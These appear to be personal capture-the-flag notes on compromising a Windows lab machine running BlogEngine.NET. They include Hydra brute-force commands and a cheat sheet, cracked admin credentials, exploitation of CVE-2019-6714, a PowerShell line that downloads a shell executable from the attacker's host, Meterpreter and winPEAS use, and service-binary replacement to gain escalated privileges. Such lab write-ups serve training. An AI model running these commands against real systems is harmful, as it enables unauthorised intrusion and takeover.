#THM #EscaltePriv #Windows  #Hydra

#### Hydra

```bash
hydra 10.10.76.177 http-form-post "/Account/login.aspx?ReturnURL=/admin:
__VIEWSTATE=..Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"

login: admin   password: 1qaz2wsx
```

* mini cheat sheat
```bash
Brute force against a protocol of your choice
	hydra -P <wordlist> -v <ip> <protocol>  

You can use Hydra to bruteforce usernames as well as passwords. 
It will loop through every combination in your lists. (-vV = verbose mode, showing login attempts)
	hydra -v -V -u -L <username list> -P <password list> -t 1 -u <ip> <protocol>  

Attack a Windows Remote Desktop with a password list.
	hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>  

Craft a more specific request for Hydra to brute force.
	hydra -l <username> -P .<password list> $ip -V http-form-post 
	'/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=LogIn&testcookie=1:S=Location'  
```

#### Compromise the machine_ip

* BlogEngine.NET
	*  3.3.6.0 
	* CVE: 2019-6714  Directory Traversal / Remote Code Execution
		* run uploaded file ?theme=../../App_Data/files

```bash
c:\windows\system32\inetsrv>whoami
iis apppool\Blog
```

#### Windows Priviledge Escalation
* /jeff/Downloads
	* powershell -c wget "http://10.11.57.111:8000/shell2me.exe" -outfile "shell2me.exe"

```bash
meterpreter > sysinfo
Computer        : HACKPARK
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows

upload winPEAS.exe
load powershell
powershell_shell
. .\winPEAS.exe

==Interesting Services==
WindowsScheduler(Splinterware Software Solutions - System Scheduler Service)[C:\PROGRA~2\SYSTEM~1\WService.exe] - Auto - Running
    File Permissions: Everyone [WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\SystemScheduler (Everyone [WriteData/CreateFiles])
System Scheduler Service Wrapper
```
* /event/..log.txt 
	* admin service Message.exe restarts every 30s
* replace Message.exe with shell2me.exe
* listen on 1337

```bash
C:\PROGRA~2\SYSTEM~1>
```